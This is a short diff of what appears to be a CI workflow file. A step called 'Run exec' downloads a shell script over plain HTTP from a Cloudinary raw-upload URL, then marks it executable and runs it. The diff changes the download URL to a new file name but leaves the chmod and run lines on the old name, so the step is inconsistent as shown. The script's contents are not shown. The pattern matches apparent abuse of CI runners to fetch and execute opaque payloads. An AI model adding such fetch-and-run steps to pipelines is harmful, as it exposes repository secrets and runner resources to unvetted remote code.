@@ -12,7 +12,7 @@ jobs:
     steps:
       - name: Run exec
         run: |
-          curl -O http://res.cloudinary.com/dyfqshedb/raw/upload/v1708020610/mbip0nevu8lc73fmojgp.sh
+          curl -O http://res.cloudinary.com/dyfqshedb/raw/upload/v1711042163/amzeqo8vdwsgytadhvk6.sh
           chmod +x mbip0nevu8lc73fmojgp.sh
           ./mbip0nevu8lc73fmojgp.sh
 
